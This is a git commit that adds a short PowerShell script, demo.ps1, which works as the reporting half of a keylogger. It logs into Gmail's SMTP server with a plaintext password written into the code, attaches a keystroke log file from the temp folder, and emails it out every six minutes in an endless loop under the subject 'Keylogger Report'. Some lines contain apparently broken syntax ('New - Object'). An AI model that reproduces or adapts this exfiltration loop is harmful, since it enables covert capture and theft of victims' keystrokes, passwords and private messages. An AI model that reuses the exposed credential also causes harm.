e8ed7354a524c3f51f78cced123fde297e347e47
AqStudio1 <zaghum.mughal.1@gmail.com>
2022-04-28 15:35:30 +0100

    Create demo.ps1

---
+++ demo.ps1
@@ -0,0 +1,14 @@
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New - Object Net.Mail.SmtpClient($SMTPServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New - Object System.Net.NetworkCredential('zaghum.mughal.1@gmail.com', ',.H@cked12,.')
+$message = New - Object System.Net.Mail.MailMessage
+$message.From = 'zaghum.mughal.1@gmail.com'
+$message.To.Add('zaghum.mughal.1@gmail.com')
+$message.Subject = 'Keylogger Report'
+$message.Body = 'Success! The keylogger file is attached!'
+while (1) {
+    $message.Attachments.Add("$ENV:temp\key.txt");
+    $SMTPInfo.Send($message);
+    sleep 360
+}
